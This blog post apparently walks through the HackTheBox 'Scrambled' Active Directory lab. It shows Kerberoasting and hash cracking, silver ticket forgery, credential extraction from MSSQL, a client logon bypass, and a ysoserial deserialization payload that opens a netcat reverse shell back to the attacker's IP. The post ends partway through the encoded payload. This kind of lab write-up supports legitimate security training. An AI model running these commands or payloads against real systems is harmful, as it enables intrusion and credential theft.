---
layout: post
title: HTB Scrambled Writeup
date: 2026-03-31 00:49 -0400
categories: [Writeups, HackTheBox]
tags: [ctf]
---

## Initial Enumeration
We start off with a standard nmap scan
``` zsh
sudo nmap -sC -sV -vv --top-ports=5000 $TARGETIP -oN nmapout
```

**Open Ports**
``` shell
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-03-31 01:38:35Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scrm.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scrm.local, Site: Default-First-Site-Name)
1433/tcp open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scrm.local, Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scrm.local, Site: Default-First-Site-Name)
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

From the certificates we can see the FDQN, let's add it to our `/etc/hosts` file:
``` shell
echo "$TARGETIP    DC1.scrm.local scrm.local" | sudo tee -a /etc/hosts
```

## Service Enumeration

SMB listing as Guest or null is not supported. LDAP, RPC, and MSSQL cannot be accessed either. We will have likely have to go through the site on port 80.

### HTTP Enumeration
The site seems to be a basic static HTML / JS  site:
![alt text](/assets/img/HTBWriteupScreenshots/Scrambled_1.png)

A banner on the website indicates NTLM authentication has been disabled:
```
04/09/2021: Due to the security breach last month we have now disabled all NTLM authentication on our network. This may cause problems for some of the programs you use so please be patient while we work to resolve any issues 
```

![alt text](/assets/img/HTBWriteupScreenshots/Scrambled_2.png)

The only tab that works is the "IT Services Tab". There are four links available on this page. The "Contacting IT Support" link provides us with some information:

![alt text](/assets/img/HTBWriteupScreenshots/Scrambled_3.png)

We see two possible usernames (**support** & **ksimpson**). The other links on the site don't seem to provide much further information.

### SMB Enumeration
Given this information regarding NTLM, we will setup Kerberos authentication for this domain. We can generate the **krb5.conf** file required with nxc:
``` shell
nxc smb $TARGETIP -u 'Guest' -p '' -k --generate-krb5-file krb5.conf
```

We will replace our **/etc/krb5.conf** with this newly generated one.  We can now interacting with the services with Guest / Null:
``` shell
nxc smb $TARGETIP -u 'Guest' -p '' -k                               
SMB         10.129.11.10    445    DC1              [*]  x64 (name:DC1) (domain:scrm.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.11.10    445    DC1              [-] scrm.local\Guest: KDC_ERR_CLIENT_REVOKED 
                                                                                                                                                                                                                                                                              
nxc smb $TARGETIP -u '' -p '' -k  
SMB         10.129.11.10    445    DC1              [*]  x64 (name:DC1) (domain:scrm.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.11.10    445    DC1              [-] CCache Error: invalid principal syntax
```

Let's see if those usernames are valid:
``` shell
nxc smb $TARGETIP -u 'ksimpson' -p '' -k 
SMB         10.129.11.10    445    DC1              [*]  x64 (name:DC1) (domain:scrm.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.11.10    445    DC1              [-] scrm.local\ksimpson: KDC_ERR_PREAUTH_FAILED
nxc smb $TARGETIP -u 'support' -p '' -k          
SMB         10.129.11.10    445    DC1              [*]  x64 (name:DC1) (domain:scrm.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.11.10    445    DC1              [-] scrm.local\support: KDC_ERR_C_PRINCIPAL_UNKNOWN
```

It looks like **ksimspon** is indeed a valid username. We can try authenticating with the username as the password:
``` shell
nxc smb $TARGETIP -u 'ksimpson' -p 'ksimpson' -k --shares
SMB         10.129.11.10    445    DC1              [*]  x64 (name:DC1) (domain:scrm.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.11.10    445    DC1              [+] scrm.local\ksimpson:ksimpson 
SMB         10.129.11.10    445    DC1              [*] Enumerated shares
SMB         10.129.11.10    445    DC1              Share           Permissions     Remark
SMB         10.129.11.10    445    DC1              -----           -----------     ------
SMB         10.129.11.10    445    DC1              ADMIN$                          Remote Admin
SMB         10.129.11.10    445    DC1              C$                              Default share
SMB         10.129.11.10    445    DC1              HR                              
SMB         10.129.11.10    445    DC1              IPC$            READ            Remote IPC
SMB         10.129.11.10    445    DC1              IT                              
SMB         10.129.11.10    445    DC1              NETLOGON        READ            Logon server share 
SMB         10.129.11.10    445    DC1              Public          READ            
SMB         10.129.11.10    445    DC1              Sales                           
SMB         10.129.11.10    445    DC1              SYSVOL          READ            Logon server share
```

Not only do we have credentials, we also have a non-standard share which is able to be read. We will generate a Kerberos ticket to interact further as our ksimpson user:
``` shell
kinit ksimpson
Password for ksimpson@SCRM.LOCAL:
```

We will use the **spider_plus** module with nxc to download the information from the shares:
``` shell
netexec smb $TARGETIP -k -u ksimpson -p ksimpson --shares -M spider_plus -o OUTPUT_FOLDER=$(pwd) MAX_FILE_SIZE=10000000 DOWNLOAD=True
```

We find a PDF in the Public share:
``` shell
pdftotext Network\ Security\ Changes.pdf
```

The contents give some more context on their breach, as well as a note about the SQL service:
``` shell
cat Network\ Security\ Changes.txt 
Scramble Corp

ADDITIONAL SECURITY MEASURES
Date: 04/09/2021
FAO: All employees
Author: IT Support

As you may have heard, our network was recently compromised and an attacker was able to access
all of our data. We have identified the way the attacker was able to gain access and have made some
immediate changes. You can find these listed below along with the ways these changes may impact
you.

Change: As the attacker used something known as "NTLM relaying", we have disabled NTLM
authentication across the entire network.
Users impacted: All
Workaround: When you log on or access network resources you will now be using Kerberos
authentication (which is definitely 100% secure and has absolutely no way anyone could exploit it).
This will require you to use the full domain name (scrm.local) with your username and any server
names you access.

Change: The attacker was able to retrieve credentials from an SQL database used by our HR software
so we have removed all access to the SQL service for everyone apart from network administrators.
Users impacted: HR department
Workaround: If you can no longer access the HR software please contact us and we will manually
grant your account access again.
```

We will work to gather a username list to see if we can attempt to break this "%100 secure" Kerberos authentication:
``` shell
nxc smb $TARGETIP -u ksimpson -p ksimpson -k --rid-brute > userraw 
cat userraw | grep "SidTypeUser" | cut -d ":" -f 2 | cut -d "\\" -f 2 | cut -d "(" -f 1 > users.txt
```

**Users.txt**
``` 
administrator 
Guest 
krbtgt 
DC1$ 
tstar 
asmith 
sjenkins 
sdonington 
WS01$ 
backupsvc 
jhall 
rsmith 
ehooker 
khicks 
sqlsvc 
miscsvc 
ksimpson
```

No luck with ASREPRoasting:
``` shell
impacket-GetNPUsers scrm.local/ksimpson:ksimpson@DC1.scrm.local -k -request -dc-host DC1.scrm.local 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

No entries found!
```

However we are able to get a TGS for the **sqlsvc** user:
``` shell
impacket-GetUserSPNs scrm.local/ksimpson:ksimpson@DC1.scrm.local -k -request -dc-host DC1.scrm.local
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 12:32:02.351452  2026-03-30 21:36:27.623570             
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 12:32:02.351452  2026-03-30 21:36:27.623570             



$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$37fa9becebdc0a385006b7f5117f4f2b$7ddd12e2e794c55b41db56b9c55987a2234f807ad3209b780b35c4e340d5223cbc0daf99ec97b079018181044d416e5ae5f05fe68a7bbfa04738f7d83d95376afba709c129173e4f2e26cb13cfede87b3f30128998bd2220d41ff501ba99b50ef4eff55f547d4ad14ac2456e77445b4f7162f392d36466a5c8c321349126f2476a19803e78eb58e1469e94a9907381e163d44447313d1183570844a80dc6a61bf072e01d8eedf7ab0d93909ea6a68964ceb3550828a42f8633f04fc6482c6d9e6fa4d4ae1a8d1443249fb78997ed7e048bbbd2458ef002b0381d7487cdaacc1f6692137e201f7bbf2e9dc987537ae93d4fb0af80f568b3eaa82838c6f99188b640b0a833fa3cf979a65882b6596db55c5cacfdad809701b1028815252d1540aa7454f90d4cfce044599706aad4e2e41ab85e9abdbbbb9d191767d2ba5444056b61fc32fafd98924754644929d3def20db62d3ab884abb8dce71a8377c8e4ef15540565f9cba45c4709c676c6d66a9eb2f330d973a7d63ee59c71cd2aefc2753b9f7659dcd083020927764115682f4a380d61a5ce8f6b81756404a0f39241f1a3974abbe3607f0f8146ed44abc3592614e5e121b67bbc8c05d0f18e821fd36759b54c86a88f12706d6451e8f638fb2979eeb4c95d884f35bf781c17bd480b4b31dcb93d1f397f200966d7059c112abc650e2974cb99cd3bd2c4fc193d6f7c8d76c02afad3a4f99cd38bff28abe20ec9d74eb697c0a64a47384965332b61b9dda27401bc3958c8de93e4baba4dafc02c853da300d63d072745bccda443327fae2ac40d10c48dfff7bf9cca006a81ef21bc1f5c000612a8fefa0fcf8a5600a6c9ef841a0e4d7e4b1f09cab2b0f38aea6f4fae88e8c7ce28c5a72989f577b91aafeb94cb2b146f6cf561b8b019a07baf92135275e0641cde0177460b61c1ef391368019115671b704458e9a6967ca262af433a4997790a412641f9e3bc9459a04e2174d42ef389726b8e519e9014588da67bc8064cf066a73088e56ef44bc61b958b9a46823d354f77d69af079b1b51eb766b604bc81fc84868dfaf3b52a4894ef4bc3fc24193164f9f75e1bc97d243f6470e67e1d003aa72934dfad2bb00fc16be99b23c021edf165879ca17cb4b820283a41183b8ced7c225fc0f5c269604c2dc7836e059c40cc3022f5d2f0de2f242086cc6519f271d67453cea9ed857b7b248de678f6c040220dbfcfc055bfc984fc3ab2fe041c0d6aac2221171226016d28578b7f3dd34f0a2a1024b3c3b2ad8f5f32d7422282e1e5d13b7f064f8b69bb2d6ca93255f8f5ea02ea152aa297b09c1d9e47ab3288dc0e1c863d56aee08937adeb5c74011f05da98f71ecb3c76a177a82ef9a3dab2b80519b210df9352a45a3a342d43314c58cdd02abbae19a7e25edaadb267854eed3f40a15046b8
```

Let's try cracking this:
``` shell
hashcat '$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$37fa9becebdc0a385006b7f5117f4f2b$7ddd12e2e794c55b41db56b9c55987a2234f807ad3209b780b35c4e340d5223cbc0daf99ec97b079018181044d416e5ae5f05fe68a7bbfa04738f7d83d95376afba709c129173e4f2e26cb13cfede87b3f30128998bd2220d41ff501ba99b50ef4eff55f547d4ad14ac2456e77445b4f7162f392d36466a5c8c321349126f2476a19803e78eb58e1469e94a9907381e163d44447313d1183570844a80dc6a61bf072e01d8eedf7ab0d93909ea6a68964ceb3550828a42f8633f04fc6482c6d9e6fa4d4ae1a8d1443249fb78997ed7e048bbbd2458ef002b0381d7487cdaacc1f6692137e201f7bbf2e9dc987537ae93d4fb0af80f568b3eaa82838c6f99188b640b0a833fa3cf979a65882b6596db55c5cacfdad809701b1028815252d1540aa7454f90d4cfce044599706aad4e2e41ab85e9abdbbbb9d191767d2ba5444056b61fc32fafd98924754644929d3def20db62d3ab884abb8dce71a8377c8e4ef15540565f9cba45c4709c676c6d66a9eb2f330d973a7d63ee59c71cd2aefc2753b9f7659dcd083020927764115682f4a380d61a5ce8f6b81756404a0f39241f1a3974abbe3607f0f8146ed44abc3592614e5e121b67bbc8c05d0f18e821fd36759b54c86a88f12706d6451e8f638fb2979eeb4c95d884f35bf781c17bd480b4b31dcb93d1f397f200966d7059c112abc650e2974cb99cd3bd2c4fc193d6f7c8d76c02afad3a4f99cd38bff28abe20ec9d74eb697c0a64a47384965332b61b9dda27401bc3958c8de93e4baba4dafc02c853da300d63d072745bccda443327fae2ac40d10c48dfff7bf9cca006a81ef21bc1f5c000612a8fefa0fcf8a5600a6c9ef841a0e4d7e4b1f09cab2b0f38aea6f4fae88e8c7ce28c5a72989f577b91aafeb94cb2b146f6cf561b8b019a07baf92135275e0641cde0177460b61c1ef391368019115671b704458e9a6967ca262af433a4997790a412641f9e3bc9459a04e2174d42ef389726b8e519e9014588da67bc8064cf066a73088e56ef44bc61b958b9a46823d354f77d69af079b1b51eb766b604bc81fc84868dfaf3b52a4894ef4bc3fc24193164f9f75e1bc97d243f6470e67e1d003aa72934dfad2bb00fc16be99b23c021edf165879ca17cb4b820283a41183b8ced7c225fc0f5c269604c2dc7836e059c40cc3022f5d2f0de2f242086cc6519f271d67453cea9ed857b7b248de678f6c040220dbfcfc055bfc984fc3ab2fe041c0d6aac2221171226016d28578b7f3dd34f0a2a1024b3c3b2ad8f5f32d7422282e1e5d13b7f064f8b69bb2d6ca93255f8f5ea02ea152aa297b09c1d9e47ab3288dc0e1c863d56aee08937adeb5c74011f05da98f71ecb3c76a177a82ef9a3dab2b80519b210df9352a45a3a342d43314c58cdd02abbae19a7e25edaadb267854eed3f40a15046b8' /usr/share/wordlists/rockyou.txt

-----------------------

:Pegasus60
Session..........: hashcat
Status...........: Cracked
```

Attempting to login with the sqlsvc account to the MSSQL service is not successful, this is what the PDF from earlier was hinting at. Since we have the password of a service account, we can perform a silver ticket attack to authenticate to the service as an Administrator. For this, we will need the Domain SID, the SPN, and the NTLM hash of the password.

We can gather most of this information by using bloodhound-python, which will simultaneously collect the domain information for further escalation if needed:
``` shell
bloodhound-python -c All -u ksimpson -no-pass -k --zip -ns $TARGETIP -d scrm.local
```

[SCREENSHOT 4]

We now have the Domain SID and the SPN. We will just have to recalculate the NTLM hash for the password.
``` shell
echo -n "Pegasus60" | iconv -f utf8 -t utf-16le | openssl dgst -md4
MD4(stdin)= b999a16500b87d17ec7f2e2a68778f05
```

With all our prerequisites filled, we can use the ticketer tool from impacket to generate the ccache file:
``` shell
sudo impacket-ticketer -domain scrm.local -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -spn "mssqlsvc/dc1.scrm.local" -nthash "B999A16500B87D17EC7F2E2A68778F05" Administrator
```

And now attempt to authenticate to the MSSQL service:
``` shell
export KRB5CCNAME=Administrator.ccache; impacket-mssqlclient -k -no-pass dc1.scrm.local
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC1): Line 1: Changed database context to 'master'.
[*] INFO(DC1): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (SCRM\administrator  dbo@master)>
```

Looking at the available databases, there is a non-standard one "ScrambleHR":
``` shell
SQL (SCRM\administrator  dbo@master)> enum_db
name         is_trustworthy_on   
----------   -----------------   
master                       0   
tempdb                       0   
model                        0   
msdb                         1   
ScrambleHR                   0
```

Enumerating the database:
``` sql
SQL (SCRM\administrator  dbo@ScrambleHR)> select * from information_schema.tables;
TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME   TABLE_TYPE   
-------------   ------------   ----------   ----------   
ScrambleHR      dbo            Employees    b'BASE TABLE'   
ScrambleHR      dbo            UserImport   b'BASE TABLE'   
ScrambleHR      dbo            Timesheets   b'BASE TABLE'

SQL (SCRM\administrator  dbo@ScrambleHR)> select * from UserImport;
LdapUser   LdapPwd             LdapDomain   RefreshInterval   IncludeGroups   
--------   -----------------   ----------   ---------------   -------------   
MiscSvc    ScrambledEggs9900   scrm.local                90               0
```


This looks like another user for us to look into. Let's see if can get a session with this user with evil-winrm:
```shell
kinit MiscSvc    
Password for MiscSvc@SCRM.LOCAL:


evil-winrm -i dc1.scrm.local -r scrm.local
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\miscsvc\Documents> ls C:\Users\miscsvc\Desktop


    Directory: C:\Users\miscsvc\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        3/31/2026   2:36 AM             34 user.txt
```

## User Access

Let's also check our available SMB share access with the MiscSvc user:
``` shell
nxc smb dc1.scrm.local -u MiscSvc -p ScrambledEggs9900 -k --shares
SMB         dc1.scrm.local  445    dc1              [*]  x64 (name:dc1) (domain:scrm.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc1.scrm.local  445    dc1              [+] scrm.local\MiscSvc:ScrambledEggs9900 
SMB         dc1.scrm.local  445    dc1              [*] Enumerated shares
SMB         dc1.scrm.local  445    dc1              Share           Permissions     Remark
SMB         dc1.scrm.local  445    dc1              -----           -----------     ------
SMB         dc1.scrm.local  445    dc1              ADMIN$                          Remote Admin
SMB         dc1.scrm.local  445    dc1              C$                              Default share
SMB         dc1.scrm.local  445    dc1              HR                              
SMB         dc1.scrm.local  445    dc1              IPC$            READ            Remote IPC
SMB         dc1.scrm.local  445    dc1              IT              READ            
SMB         dc1.scrm.local  445    dc1              NETLOGON        READ            Logon server share 
SMB         dc1.scrm.local  445    dc1              Public          READ            
SMB         dc1.scrm.local  445    dc1              Sales                           
SMB         dc1.scrm.local  445    dc1              SYSVOL          READ            Logon server share 
```

This user also has access to the **IT** share:
``` shell
nxc smb dc1.scrm.local -u MiscSvc -p ScrambledEggs9900 -k --shares -M spider_plus -o OUTPUT_FOLDER=$(pwd) MAX_FILE_SIZE=10000000 DOWNLOAD=True
```

Inside of the folder **IT/Apps/Sales Order Client**, there is an executable and a DLL:
``` shell
ls -la
-rw-rw-r-- 1 kali kali 86528 Mar 30 23:49 ScrambleClient.exe
-rw-rw-r-- 1 kali kali 19456 Mar 30 23:49 ScrambleLib.dll
```

Using **CodemerxDecompile**, we can review the source code the DLL and exe. It can be downloaded [here](https://github.com/codemerx/CodemerxDecompile). We are able to locate an authentication bypass by using the username **scrmdev**.
![alt text](/assets/img/HTBWriteupScreenshots/Scrambled_5.png)

This looks like a client application to connect to a custom application running on port 4411 on the server. We can identify the server port within the code:
![alt text](/assets/img/HTBWriteupScreenshots/Scrambled_6.png)

*Note: If we had initially done a full port scan, this could have been discovered earlier, however we would not have sufficient information to exploit it - so no worries : )*

We can run the executable with wine:
``` shell
wine ScrambleClient.exe
```

This opens an application window which allows us to enter a server, and username / password:

![alt text](/assets/img/HTBWriteupScreenshots/Scrambled_7.png)

Signing in with scrmdev and any password will allow for a login:

![alt text](/assets/img/HTBWriteupScreenshots/Scrambled_8.png)

The Tools option allows us to enable Debug Logging:

![alt text](/assets/img/HTBWriteupScreenshots/Scrambled_9.png)

Attempting to use the **New Order** function in the GUI breaks the application. However, let's see what we have in the log file. We can see some base64 encoded information:
``` shell
cat ScrambleDebugLog.txt
3/31/2026 12:06:30 AM   Developer logon bypass used
3/31/2026 12:06:31 AM   Getting order list from server
3/31/2026 12:06:31 AM   Getting orders from server
3/31/2026 12:06:31 AM   Connecting to server
3/31/2026 12:06:33 AM   Received from server: SCRAMBLECORP_ORDERS_V1.0.3;
3/31/2026 12:06:33 AM   Parsing server response
3/31/2026 12:06:33 AM   Response type = Banner
3/31/2026 12:06:33 AM   Sending data to server: LIST_ORDERS;
3/31/2026 12:06:33 AM   Getting response from server
3/31/2026 12:06:33 AM   Received from server: SUCCESS;AAEAAAD/////AQAAAAAAAAAMAgAAAEJTY3JhbWJsZUxpYiwgVmVyc2lvbj0xLjAuMy4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPW51bGwFAQAAABZTY3JhbWJsZUxpYi5TYWxlc09yZGVyBwAAAAtfSXNDb21wbGV0ZRBfUmVmZXJlbmNlTnVtYmVyD19RdW90ZVJlZmVyZW5jZQlfU2FsZXNSZXALX09yZGVySXRlbXMIX0R1ZURhdGUKX1RvdGFsQ29zdAABAQEDAAABf1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3RgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0NBgIAAAAABgMAAAAKU0NSTVNPMzYwMQYEAAAAC1NDUk1RVTkxODcyBgUAAAAGSiBIYWxsCQYAAAAAQBHK4mnaCAAAAAAAIHJABAYAAAB/U3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQMAAAAGX2l0ZW1zBV9zaXplCF92ZXJzaW9uBgAACAgJBwAAAAAAAAAAAAAAEQcAAAAAAAAACw==|AAEAAAD/////AQAAAAAAAAAMAgAAAEJTY3JhbWJsZUxpYiwgVmVyc2lvbj0xLjAuMy4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPW51bGwFAQAAABZTY3JhbWJsZUxpYi5TYWxlc09yZGVyBwAAAAtfSXNDb21wbGV0ZRBfUmVmZXJlbmNlTnVtYmVyD19RdW90ZVJlZmVyZW5jZQlfU2FsZXNSZXALX09yZGVySXRlbXMIX0R1ZURhdGUKX1RvdGFsQ29zdAABAQEDAAABf1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3RgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0NBgIAAAAABgMAAAAKU0NSTVNPMzc0OQYEAAAAC1NDUk1RVTkyMjEwBgUAAAAJUyBKZW5raW5zCQYAAAAAAJ07rZbaCAAAAAAAUJJABAYAAAB/U3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQMAAAAGX2l0ZW1zBV9zaXplCF92ZXJzaW9uBgAACAgJBwAAAAAAAAAAAAAAEQcAAAAAAAAACw==
3/31/2026 12:06:33 AM   Parsing server response
3/31/2026 12:06:33 AM   Response type = Success
3/31/2026 12:06:33 AM   Splitting and parsing sales orders
3/31/2026 12:06:33 AM   Found 2 sales orders in server response
3/31/2026 12:06:33 AM   Deserializing single sales order from base64: AAEAAAD/////AQAAAAAAAAAMAgAAAEJTY3JhbWJsZUxpYiwgVmVyc2lvbj0xLjAuMy4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPW51bGwFAQAAABZTY3JhbWJsZUxpYi5TYWxlc09yZGVyBwAAAAtfSXNDb21wbGV0ZRBfUmVmZXJlbmNlTnVtYmVyD19RdW90ZVJlZmVyZW5jZQlfU2FsZXNSZXALX09yZGVySXRlbXMIX0R1ZURhdGUKX1RvdGFsQ29zdAABAQEDAAABf1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3RgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0NBgIAAAAABgMAAAAKU0NSTVNPMzYwMQYEAAAAC1NDUk1RVTkxODcyBgUAAAAGSiBIYWxsCQYAAAAAQBHK4mnaCAAAAAAAIHJABAYAAAB/U3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQMAAAAGX2l0ZW1zBV9zaXplCF92ZXJzaW9uBgAACAgJBwAAAAAAAAAAAAAAEQcAAAAAAAAACw==
3/31/2026 12:06:33 AM   Binary formatter init successful
3/31/2026 12:06:33 AM   Deserialization successful
3/31/2026 12:06:33 AM   Deserializing single sales order from base64: AAEAAAD/////AQAAAAAAAAAMAgAAAEJTY3JhbWJsZUxpYiwgVmVyc2lvbj0xLjAuMy4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPW51bGwFAQAAABZTY3JhbWJsZUxpYi5TYWxlc09yZGVyBwAAAAtfSXNDb21wbGV0ZRBfUmVmZXJlbmNlTnVtYmVyD19RdW90ZVJlZmVyZW5jZQlfU2FsZXNSZXALX09yZGVySXRlbXMIX0R1ZURhdGUKX1RvdGFsQ29zdAABAQEDAAABf1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3RgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0NBgIAAAAABgMAAAAKU0NSTVNPMzc0OQYEAAAAC1NDUk1RVTkyMjEwBgUAAAAJUyBKZW5raW5zCQYAAAAAAJ07rZbaCAAAAAAAUJJABAYAAAB/U3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQMAAAAGX2l0ZW1zBV9zaXplCF92ZXJzaW9uBgAACAgJBwAAAAAAAAAAAAAAEQcAAAAAAAAACw==
3/31/2026 12:06:33 AM   Binary formatter init successful
3/31/2026 12:06:33 AM   Deserialization successful
3/31/2026 12:06:33 AM   Finished deserializing all sales orders
```

Doing some research into .NET and the BinaryFormatter, we discover there exist some serious vulnerabilities within it: https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide 

These can be exploited with the [ysoserial tool](https://github.com/pwntester/ysoserial.net)

We're going to move this to our Windows VM to run this executable so we can forego having to fuss with wine.

In order to access the target through our existing VPN, we can setup port forwarding on our linux machine:
``` shell
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -t nat -A POSTROUTING -o tun0 -j MASQUERADE
sudo iptables -A FORWARD -i eth1 -o tun0 -j ACCEPT                                           
sudo iptables -A FORWARD -i tun0 -o eth1 -m state --state RELATED,ESTABLISHED -j ACCEPT
```

On our windows device, we will get ysoserial configured to generate a payload:
``` shell
PS C:\users\vboxuser\ysoserial.net\ysoserial\bin\Debug> .\ysoserial.exe -g AxHostState -f BinaryFormatter -c "C:\Users\Miscsvc\nc64.exe -e cmd 10.10.14.8 8888" -o base64
AAEAAAD/////AQAAAAAAAAAMAgAAAFdTeXN0ZW0uV2luZG93cy5Gb3JtcywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAACFTeXN0ZW0uV2luZG93cy5Gb3Jtcy5BeEhvc3QrU3RhdGUBAAAAEVByb3BlcnR5QmFnQmluYXJ5BwICAAAACQMAAAAPAwAAAL0DAAACAAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAA3wU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UH